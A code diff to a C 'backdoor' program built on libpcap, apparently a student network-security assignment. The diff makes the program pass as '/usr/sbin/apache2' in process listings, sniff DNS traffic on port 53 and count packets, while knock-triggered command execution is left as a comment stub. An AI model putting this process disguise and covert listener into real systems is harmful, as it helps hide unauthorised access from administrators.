@@ -1,3 +1,29 @@
+/*---------------------------------------------------------------------------------------
+--	SOURCE FILE:	backdoor
+--
+--	FUNCTIONS:		libpcap - packet filtering library based on the BSD packet
+--					filter (BPF)
+--
+--	DATE:			May 21, 2015
+--
+--	REVISIONS:		(Date and nic_description)
+--
+--	DESIGNERS:		Based on the code by Martin Casado & Richard Stevens
+--					Modified & redesigned: Aman Abdulla: April 23, 2006
+--
+--	PROGRAMMER:		Tim Kim, Damien Sathanielle
+--
+--	NOTES:
+--	The program
+--
+--	Compile and run:
+--
+--		gcc -Wall -o backdoor backdoor.c -lpcap
+--
+--		./backdoor
+
+---------------------------------------------------------------------------------------*/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,7 +38,8 @@
 
 
 
-#define MASK "BACKDOOR"
+#define MASK "/usr/sbin/apache2 -k start -DSSL"
+#define NIC "wlp3s0"
 /*-----------------------------------------------------------------------------------------------
 -- FUNCTION:   mask_application(char *name)
 --             name - 
@@ -51,6 +78,11 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 
 	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
 
+	static int count = 1;
+	fprintf(stdout,"%d.. ",count);
+	fflush(stdout);
+	count++;
+
 
 	// if knock... execute_backdoor
 }
@@ -87,7 +119,7 @@ int main(int argc, char *argv[])
 {
 	char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char filter_exp[] = "port 22";  // filter expression
+	char filter_exp[] = "port 53";  // filter expression
 	const u_char *packet;
 
 	struct bpf_program fp;  // compiled filter expression
@@ -100,7 +132,7 @@ int main(int argc, char *argv[])
 
 	mask_application(argv[0]);
 
-	dev = "wlan0"; //pcap_lookupdev(errbuf);
+	dev = NIC; //pcap_lookupdev(errbuf);
 	if(dev == NULL)
 	{
 		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
